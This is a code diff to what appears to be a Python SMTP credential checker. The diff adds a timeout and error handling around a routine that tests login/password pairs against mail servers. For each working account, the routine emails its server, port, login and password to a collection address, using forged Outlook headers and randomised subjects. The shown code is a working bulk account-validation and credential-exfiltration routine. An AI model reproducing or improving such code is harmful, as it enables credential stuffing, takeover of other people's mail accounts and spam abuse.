@@ -352,40 +352,49 @@ def socket_try_mail(sock, smtp_from, smtp_to, data):
 	sock.close()
 	raise Exception(answer)
 
+# Устанавливаем таймаут для SMTP-соединения (30 секунд)
+socket.setdefaulttimeout(30)
+
 def smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password):
 	global verify_email
 	if is_valid_email(smtp_user):
 		smtp_login = login_template.replace('%EMAILADDRESS%', smtp_user).replace('%EMAILLOCALPART%', smtp_user.split('@')[0]).replace('%EMAILDOMAIN%', smtp_user.split('@')[1])
 	else:
 		smtp_login = smtp_user
-	s = socket_get_free_smtp_server(smtp_server, port)
-	answer = socket_send_and_read(s)
-	if answer[:3] == '220':
-		s = socket_try_tls(s, smtp_server) if port != '465' else s
-		s = socket_try_login(s, smtp_server, smtp_login, password)
-		if not verify_email:
-			s.close()
-			return True
-		headers_arr = [
-			'From: %s <%s>' % (smtp_user.split('@')[0], smtp_user),
-			'Resent-From: admin@localhost',
-			'To: '+verify_email,
-			f'Subject: {"".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(4, 8)))} #{random.randint(10**3, 10**7)}',
-			'Return-Path: '+smtp_user,
-			'Reply-To: '+smtp_user,
-			'X-Priority: 1',
-			'X-MSmail-Priority: High',
-			'X-Mailer: Microsoft Office Outlook, Build 10.0.5610',
-			'X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1441',
-			'MIME-Version: 1.0',
-			'Content-Type: text/html; charset="utf-8"',
-			'Content-Transfer-Encoding: 8bit'
-		]
-		body = f'{smtp_server},{port},{smtp_login},{password}'
-		message_as_str = '\r\n'.join(headers_arr+['', body, '.', ''])
-		return socket_try_mail(s, smtp_user, verify_email, message_as_str)
-	s.close()
-	raise Exception(answer)
+
+	try:
+		s = socket_get_free_smtp_server(smtp_server, port)
+		answer = socket_send_and_read(s)
+		if answer[:3] == '220':
+			s = socket_try_tls(s, smtp_server) if port != '465' else s
+			s = socket_try_login(s, smtp_server, smtp_login, password)
+			if not verify_email:
+				s.close()
+				return True
+			headers_arr = [
+				'From: %s <%s>' % (smtp_user.split('@')[0], smtp_user),
+				'Resent-From: admin@localhost',
+				'To: '+verify_email,
+				f'Subject: {"".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(4, 8)))} #{random.randint(10**3, 10**7)}',
+				'Return-Path: '+smtp_user,
+				'Reply-To: '+smtp_user,
+				'X-Priority: 1',
+				'X-MSmail-Priority: High',
+				'X-Mailer: Microsoft Office Outlook, Build 10.0.5610',
+				'X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1441',
+				'MIME-Version: 1.0',
+				'Content-Type: text/html; charset="utf-8"',
+				'Content-Transfer-Encoding: 8bit'
+			]
+			body = f'{smtp_server},{port},{smtp_login},{password}'
+			message_as_str = '\r\n'.join(headers_arr+['', body, '.', ''])
+			return socket_try_mail(s, smtp_user, verify_email, message_as_str)
+		s.close()
+		raise Exception(answer)
+
+	except (socket.timeout, ConnectionResetError) as e:
+		print(f"[ERROR] SMTP-соединение разорвано или зависло: {e}")
+		return False
 
 def worker_item(jobs_que, results_que):
 	global min_threads, threads_counter, verify_email, goods, smtp_filename, no_jobs_left, loop_times, default_login_template, mem_usage, cpu_usage
